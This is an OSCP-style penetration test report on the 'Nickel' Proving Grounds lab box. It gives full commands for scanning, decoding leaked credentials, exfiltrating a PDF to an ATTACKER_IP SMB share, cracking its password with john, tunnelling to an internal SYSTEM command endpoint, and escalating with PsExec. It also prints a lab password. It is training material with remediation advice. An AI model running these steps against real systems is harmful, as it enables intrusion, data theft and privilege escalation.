# PGP Nickel - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-2-12

---

## 0. Lesson Learned

Always check C:\ for files.

---

## 1. Executive Summary

A penetration test was conducted against the Windows host *Nickel*. The objective was to identify vulnerabilities, obtain initial access, and escalate privileges to SYSTEM level. The host was compromised through web and service enumeration that uncovered a DevOps dashboard exposing backend functionality and Base64-encoded credentials, which provided SSH access as user *ariah*. Post-exploitation revealed a password-protected PDF containing infrastructure details. After cracking the password, SSH port forwarding exposed and internal API running as **NT AUTHORITY\SYSTEM** that allowed arbitrary PowerShell command execution. This was leveraged to add *ariah* to the local Administrators group, and SYSTEM-level access was obtained using PsExec, allowing retrieval of both user and administrator proof files.

---

## 2. Scope

- **Target:** 192.168.207.99
- **Environment:** Proving Grounds Practice Nickel
- **Testing Window:** 2026-2-11
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A TCP scan was run with Nmap:

```
nmap -p- -sCV 192.168.207.99 -T4 -oA nickel_initial
```

Identifying the following open ports:

- 21/tcp - FTP (FileZilla ftpd 0.9.60 beta)
- 22/tcp - OpenSSH for Windows 8.1
- 135/tcp - MSRPC
- 139/tcp - NetBIOS
- 445/tcp - SMB
- 3389/tcp - RDP
- 8089/tcp - HTTP (Microsoft HTTPAPI 2.0)
- 33333/tcp - HTTP (Microsoft HTTPAPI 2.0)
- 5040/tcp, 7680/tcp - Unknown
- 49664-49669/tcp - RPC

An initial UDP scan was run with Nmap:

```
nmap -sU --top-ports 50 -T4 192.168.207.99 -oA nickel_udp
```

No significant UDP attack surface was identified.

---

## 5. Enumeration

Anonymous SMB access was denied:

```
smbclient -L //192.168.207.99 -U anonymous
```

Anonymous FTP login was unsuccessful:

```
ftp 192.168.207.99
```

RDP access was denied:

```
rdpclient -U "" -N 192.168.207.99
```

The HTTP port 8089 was enumerated revealing backend GET requests to APIPA address port 33333 and the following directories:

```
/list-current-deployments

/list-running-procs

/list-active-nodes
```

Direct access to port 33333 returned "Invalid Token". Using Burp to change the request type to POST and probing the above directories exposed credentials on `/list-running-procs`:

```
ariah : Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

Base64 Decoded:

```
ariah : NowiseSloopTheory139
```

---

## 6. Initial Access

Using the exposed credentials, SSH access was obtained:

```
ssh ariah@192.168.207.99
```

This resulted in unprivileged access.

---

## 7. Post-Exploitation

Manual enumeration and winPEAS deployment identified a *System* service listening locally on port 80.

```
netstat -ano
```

A password-protected PDF file was located:

```
C:\ftp\Infrastructure.pdf
```

The PDF file was exfiltrated via SMB on the attacker machine:

```
sudo python3 smbserver.py share . -smb2support -username user -password pass
```

And shared via SMB on the target machine:

```
net use M: \\ATTACKER_IP\share /user:user pass

copy C:\ftp\Infrastructure.pdf M:\

net use M: /delete
```

On the attacker machine, the password was brute forced with john:

```
pdf2john Infrastructure.pdf > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

This revealed the PDF password `ariah4168` that exposed the temporary command endpoint:

```
http://nickel/?
```

Pairing this with the listening *System* service on port 80 suggested a remote command endpoint.

---

## 8. Privilege Escalation

SSH Port Forwarding was performed to internal port 80:

```
ssh -f -N -L 127.0.0.1:8081:127.0.0.1:80 ariah@192.168.207.99
```

And remote command execution confirmed `nt authority\system` execution:

```
curl http://localhost:8081/?whoami
```

User *ariah* was added to local Administrators:

```
curl 'http://localhost:8081/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'
```

PsExec was uploaded with scp:

```
scp PsExec64.exe ariah@192.168.207.99:C:\Users\ariah\psexec.exe
```

And execution resulted in command execution as `nt authority\system`:

```
psexec.exe -accepteula -s cmd.exe
```

This resulted in *SYSTEM* shell access.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\ariah\Desktop\local.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

1. **Exposed DevOps dashboard disclosed backend functionality and internal service routing:** Remove development dashboards from production environments, enforce authentication and access controls, and restrict internal service exposure through firewall segmentation.

2. **Base64-encoded credentials exposed via web application responses enabled unauthorized SSH access:** Eliminate hardcoded or client-exposed credentials, implement secure secret management practices, and conduct regular code reviews to prevent credential leakage.

3. **Internally bound SYSTEM-level API allowed arbitrary PowerShell command execution via SSH port forwarding:** Require strong authentication and input validation for internal APIs, restrict execution privileges, and ensure sensitive services are not accessible through user-controlled tunneling.

4. **Weak password protection on sensitive infrastructure documentation allowed offline password cracking:** Enforce strong password policies, avoid storing critical infrastructure documentation locally in accessible directories, and implement file-level access controls.

5. **Local administrative privileges granted through command injection enabled full system compromise:** Apply the principle of least privilege, monitor group membership changes, and restrict administrative modification capabilities to properly secured management interfaces.

---

## 11. Appendix

Reference for Copying Files from Remote Windows to Local Linux -
[https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279](https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279)